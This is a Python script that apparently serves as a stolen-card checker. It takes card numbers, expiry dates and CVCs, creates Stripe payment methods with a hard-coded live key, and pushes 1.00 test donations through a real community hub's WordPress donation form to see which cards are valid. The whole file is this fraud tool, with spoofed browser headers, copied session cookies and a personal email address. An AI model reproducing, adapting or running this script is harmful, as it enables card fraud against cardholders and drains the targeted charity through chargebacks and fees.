import requests
import re
import random

def Tele(ccx):
    ccx = ccx.strip()
    n = ccx.split("|")[0]
    mm = ccx.split("|")[1]
    yy = ccx.split("|")[2]
    cvc = ccx.split("|")[3]

    if "20" in yy:  # Mo3gza
        yy = yy.split("20")[1]

    r = requests.session()

    random_amount1 = random.randint(1, 4)
    random_amount2 = random.randint(1, 99)

    headers = {
        'authority': 'api.stripe.com',
        'accept': 'application/json',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://js.stripe.com',
        'referer': 'https://js.stripe.com/',
        'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
    }

    data = (
        f"type=card&billing_details[name]=Max"
        f"&card[number]={n}"
        f"&card[cvc]={cvc}"
        f"&card[exp_month]={mm}"
        f"&card[exp_year]={yy}"
        f"&guid=NA&muid=NA&sid=NA"
        f"&payment_user_agent=stripe.js%2F4ce67fde21%3B+stripe-js-v3%2F4ce67fde21%3B+card-element"
        f"&key=pk_live_51JFgfTKqjmzJCbSr9wtxl0XojHckW6m9jJFVUKw1MHDix6dpGRuJAPXV0LRBU5y5r5FmIq8c3EVywaikYyU45Wg600Va8cE1WA"
    )

    response = requests.post(
        'https://api.stripe.com/v1/payment_methods',
        headers=headers,
        data=data
    )

    pm = response.json()['id']

    cookies = {
        '__stripe_mid': 'ff73cd86-d8f8-498d-be84-e2cfcf7448a49c1297',
        'cmplz_banner-status': 'dismissed',
        'cmplz_policy_id': '14',
        'cmplz_marketing': 'deny',
        'cmplz_statistics': 'deny',
        'cmplz_preferences': 'deny',
        'cmplz_functional': 'allow',
        'cmplz_consented_services': '',
        '__stripe_sid': 'c9a02c0c-fb79-4d7e-93fa-d0bdc002de7f1d242a',
        '__cf_bm': 'Erxl2Ye9Z2U6f1bs2iy4T7qaHjZn6FDwDbLDM5Nnz4g-1769570735-1.0.1.1-VVPLMpCY0hrSebhRegVLsf0IGDCEHThGIh8mt_.FNhCkwlaGBRzmcfVUCqq0k_WUugq0ilSopuSjlOdqoBFYCCu6bP7woTDxwA_dD.NsDuw',
    }

    headers = {
        'authority': 'levcomhub.com',
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'origin': 'https://levcomhub.com',
        'referer': 'https://levcomhub.com/donate/',
        'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }

    data = {
        'action': 'wp_full_stripe_inline_donation_charge',
        'wpfs-form-name': 'leverhulme_community_hub',
        'wpfs-form-get-parameters': '%7B%7D',
        'wpfs-custom-amount': '1.00',
        'wpfs-donation-frequency': 'one-time',
        'wpfs-custom-input[]': '',
        'wpfs-card-holder-email': 'naingsaw814@gmail.com',
        'wpfs-card-holder-name': 'Max',
        'wpfs-terms-of-use-accepted': '1',
        'wpfs-custom-amount-index': '0',
        'wpfs-stripe-payment-method-id': pm,
    }

    response = requests.post(
        'https://levcomhub.com/wp-admin/admin-ajax.php',
        cookies=cookies,
        headers=headers,
        data=data
    )

    print(response.json()['message'])

    return response.json()
